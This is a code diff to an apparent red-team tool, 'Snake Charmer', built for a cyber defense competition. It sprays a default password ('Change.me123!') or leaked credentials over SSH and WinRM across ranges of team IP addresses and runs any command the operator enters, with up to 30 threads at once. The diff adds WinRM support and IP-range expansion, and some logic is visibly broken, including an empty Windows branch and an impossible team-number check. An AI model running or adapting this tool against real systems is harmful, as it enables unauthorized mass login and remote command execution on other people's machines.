@@ -4,13 +4,38 @@
 #Targets blueteamers with leaked / default credentials
 import paramiko
 from concurrent.futures import ThreadPoolExecutor
-
+import re
+import winrm
+from winrm import exceptions as winrm_ex
 WORKERS=30 #how many threads run at once
 HOSTNAME_DICT={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}
 
+def single_connection_command_windows(hostname_in,username_in,password_in,command_in):
+    session = winrm.Session(hostname_in,auth=(username_in,password_in))
+    session.transport.session.timeout = 10
+    try:
+        r = session.run_cmd(command_in)
+        stdout = r.std_out.decode(errors="ignore") if r.std_out else ""
+        stderr = r.std_err.decode(errors="ignore") if r.std_err else ""
+        print(r.std_out.decode())
+
+        if r.status_code != 0:
+                return False, {
+                    "reason": "remote_nonzero_exit",
+                    "status_code": r.status_code,
+                    "stdout": stdout,
+                    "stderr": stderr,
+                }
+    except winrm_ex.InvalidCredentialsError as e:
+        print("Invalid credentials for winrm host: ",hostname_in,username_in,":",password_in,sep="")
+    except winrm_ex.WinRMOperationTimeoutError as e:
+        print("Timedout, host likely down or firewalled off or something host",hostname_in)
+        raise TimeoutError
+    except Exception as e:
+        print("Unexpected error on host",hostname_in,e)
 
 #ONE CONNECTION (called durring the multi-connect)
-def single_connection_command(hostname_in,username_in,password_in,command_in):
+def single_connection_command_linux(hostname_in,username_in,password_in,command_in):
     try:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -22,8 +47,11 @@ def single_connection_command(hostname_in,username_in,password_in,command_in):
         print("error, invalid credentials for box: ",hostname_in,", ",username_in,":",password_in,sep="")
     except paramiko.SSHException as e:
         print("ssh error,",e)
+    except TimeoutError:
+        print("Box timed out! Host",hostname_in,"is not responding, likely down or fire walled off")
     except Exception as e:
         print("Unexpected error on host ",hostname_in,", ",e,sep="")
+
 
 #MAKES THE CUSTOM IPS ONE WILDCARD
 def make_target_list(ip_string, variable_list): # pass it a string to be modified (ex 192.168.x.2 or 10.x.1.5), and a list of numbers to fill it in with ex [1,2,5,6,7,8]
@@ -32,20 +60,13 @@ def make_target_list(ip_string, variable_list): # pass it a string to be modifie
         to_return.append(str(ip_string).replace('x',str(number)))
     return to_return
 
-#MAKES THE CUSTOM IPS TWO WILDCARD
-def make_target_list_two_var(ip_string, variable_list_x, variable_list_y): 
-    to_return=list()
-    for number_x in variable_list_x:
-        for number_y in variable_list_y:
-            to_return.append(str(ip_string).replace('x',str(number_x)).replace('y',str(number_y)))
-    return to_return
 
 
 #RUNS THE MINIONS
 def run_multiple_multithread(ip_list,username,password,command):
     with ThreadPoolExecutor(max_workers=WORKERS) as executor:
         for ip in ip_list:
-            executor.submit(single_connection_command, ip,username,password,command)
+            executor.submit(single_connection_command_linux, ip,username,password,command)
 
 
 #ATTACK FUNCTIONS
@@ -68,40 +89,99 @@ def all_attack(username,password,command):
     for key in HOSTNAME_DICT:
         box_attack(key,username,password,command)
 
+#MAKES THE CUSTOM IPS TWO WILDCARD
+def make_target_list_two_var(ip_string, variable_list_x, variable_list_y): 
+    to_return=list()
+    for number_x in variable_list_x:
+        for number_y in variable_list_y:
+            to_return.append(str(ip_string).replace('x',str(number_x)).replace('y',str(number_y)))
+    return to_return
+
+def wildcard(input,ip_dict,username,password,command):
+    # pass#TODO implement
+    targets=list()
+    for ip_wildcard in ip_dict:
+        print(input)
+        input=input[:ip_wildcard-1]+input[ip_wildcard+2:]
+        print(input)
+
+def expand_wildcards(ip_template, wildcard_dict,username,password,command):
+
+    parts = ip_template.split('.')
+    ranges = []
+
+    # Convert each octet into a list of numbers
+    for part in parts:
+        if '-' in part:
+            start, end = map(int, part.split('-'))
+            ranges.append([str(n) for n in range(start, end + 1)])
+        else:
+            ranges.append([part])
+
+    # Generate all combinations
+    expanded_ips = []
+    def backtrack(idx=0, current=[]):
+        if idx == len(ranges):
+            expanded_ips.append('.'.join(current))
+            return
+        for val in ranges[idx]:
+            backtrack(idx + 1, current + [val])
+
+    backtrack()
+    print(expanded_ips)
+    run_multiple_multithread(expanded_ips,username,password,command)
+
 #CLI
 def cli_interface():
-    box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
     print("\n ~~ SNAKE CHARMER ~~\n")
     
     #Basic input fields
-    username=input("Target user: ")
-    password=input("Target Password (leave blank for default): ")
-    if password=="":
-        password="Change.me123!"
-    print("Using credentials ",username,":",password,sep="")
-    command=input("\nCommand to run: ")
+    os=input("Enter OS (Linux or Windows): ").upper()
+    if os == "LINUX" or os == "L":
+        username=input("Target user: ")
+        password=input("Target Password (leave blank for default): ")
+        if password=="":
+            password="Change.me123!"
+        print("Using credentials ",username,":",password,sep="")
+        command=input("\nCommand to run: ")
+        targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
+        box_targets=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
+        if "TEAM" in targets_input:
+            if targets_input[-2:-1]=="1":
+                teamnum=targets_input[-2:]
+            else:
+                teamnum=targets_input[-1:]
+            if (int(teamnum)>19 and int(teamnum)<0):
+                raise IndexError("Team number is not between 1 and 18")
+            team_attack(teamnum,username,password,command)
 
-    #Get the target ip
-    targets_input = input("Enter either a: \n-Single IP address\n-IP target framework ('192.168.x.y/10.x.1.y'), \n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
-    print(targets_input)
+        elif any(box in targets_input for box in box_targets):
+            box_attack(targets_input,username,password,command)
+        elif "ALL" in targets_input:
+            all_attack(username,password,command)
+        elif "-" in targets_input:
+            tack_index=[i for i, c in enumerate(targets_input) if c == "-"]
+            tack_dict=dict()
+            for tack in tack_index: 
+                tack_dict[tack]=(list(range(int(targets_input[tack-1:tack]),int(targets_input[tack+1:tack+2])+1)))
 
-    if "TEAM" in targets_input:
-        if targets_input[-2:-1]=="1":
-            teamnum=targets_input[-2:]
+            # wildcard(targets_input,tack_dict,username,password,command)
+            expand_wildcards(targets_input,tack_dict,username,password,command)
+
+        elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":
+            single_connection_command_linux(targets_input,username,password,command) 
+        
         else:
-            teamnum=targets_input[-1:]
-        if (int(teamnum)>19 and int(teamnum)<0):
-            raise IndexError("Team number is not between 1 and 18")
-        team_attack(teamnum,username,password,command)
+            print("No matching entries!!")
 
-    elif any(box in targets_input for box in box_targets):
-        box_attack(targets_input,username,password,command)
-    elif "ALL" in targets_input:
-        all_attack(username,password,command)
+    elif input == "WINDOWS" or input == "W":
+        pass
+
+
     else:
-        x_number=input("Enter every number you want for x seperated by just a comma (ex 1 or 1,2,4,5,6)\nx field:")
-        y_number=input("Enter every number you want for y seperated by just a comma (ex 1 or 1,2,4,5,6)\ny field:")
-        print(input,x_number,y_number)#TODO add a catch / exception raise if invalid input is given via a failed parse
+        print("Invalid input! Quitting")
+    
+
         
 def main():
     cli_interface()
@@ -123,7 +203,7 @@ def run_on_every_linux_in_team_cloud(team_num,username,password,command):
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         for ip in final_ips:
-            executor.submit(single_connection_command, ip,username,password,command)
+            executor.submit(single_connection_command_linux, ip,username,password,command)
 
 def run_on_every_linux_in_team_lan(team_num,username,password,command):
     ip_addresses="1","2","4","5","6"
@@ -133,7 +213,7 @@ def run_on_every_linux_in_team_lan(team_num,username,password,command):
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         for ip in final_ips:
-            executor.submit(single_connection_command, ip,username,password,command)
+            executor.submit(single_connection_command_linux, ip,username,password,command)
 
 def run_on_every_team_one_box_cloud(box_numb,username,password,command):
     teams=list(range(18))
@@ -144,7 +224,7 @@ def run_on_every_team_one_box_cloud(box_numb,username,password,command):
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         for ip in final_ips:
-            executor.submit(single_connection_command, ip,username,password,command)
+            executor.submit(single_connection_command_linux, ip,username,password,command)
 
 
 '''
